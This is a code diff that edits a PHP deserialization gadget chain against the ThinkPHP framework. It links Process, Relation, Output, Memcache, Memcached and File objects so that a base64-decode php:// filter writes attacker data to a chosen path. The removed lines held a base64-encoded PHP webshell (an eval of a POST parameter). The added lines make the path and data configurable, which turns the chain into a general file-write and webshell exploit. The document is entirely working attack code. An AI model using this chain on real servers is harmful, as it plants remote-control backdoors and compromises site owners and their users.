@@ -9,10 +9,10 @@ class Process
     private $status;
 
     private $processInformation;
-    public function  __construct(){
+    public function  __construct($path,$data){
         $this->processInformation['running']=true;
         $this->status=3;
-        $this->processPipes=new \think\model\Relation();
+        $this->processPipes=new \think\model\Relation($path,$data);
     }
 
 }
@@ -29,10 +29,11 @@ class Relation
     const BELONGS_TO       = 3;
     const BELONGS_TO_MANY  = 4;
     protected $type=2;
-    protected $where=1;
-    public function __construct()
+    protected $where;
+    public function __construct($path,$data)
     {
-        $this->query=new Output();
+        $this->where='AAA'.$data;
+        $this->query=new Output($path);
     }
 }
 
@@ -50,18 +51,18 @@ class Output{
         'where'
     ];
     private $handle;
-    public function __construct()
+    public function __construct($path)
     {
-        $this->handle = (new \think\session\driver\Memcache);
+        $this->handle = (new \think\session\driver\Memcache($path));
     }
 }
 namespace think\session\driver;
 class Memcache
 {
     protected $handler;
-    public function __construct()
+    public function __construct($path)
     {
-        $this->handler = (new \think\cache\driver\Memcached);
+        $this->handler = (new \think\cache\driver\Memcached($path));
     }
 }
 
@@ -74,14 +75,14 @@ class Memcached
     protected $options;
     protected $handler;
 
-    public function __construct()
+    public function __construct($path)
     {
         $this->tag = true;
         $this->options = [
             'expire'   => 0,
-            'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
+            'prefix'   => '',
         ];
-        $this->handler = (new File);
+        $this->handler = (new File($path));
     }
 }
 
@@ -89,7 +90,7 @@ class File
 {
     protected $tag;
     protected $options;
-    public function __construct()
+    public function __construct($path)
     {
         $this->tag = false;
         $this->options = [
@@ -97,7 +98,7 @@ class File
             'cache_subdir'  => false,
             'prefix'        => '',
             'data_compress' => false,
-            'path'          => 'php://filter/convert.base64-decode/resource=./',
+            'path'          => 'php://filter/convert.base64-decode/resource='.$path,
         ];
     }
 }
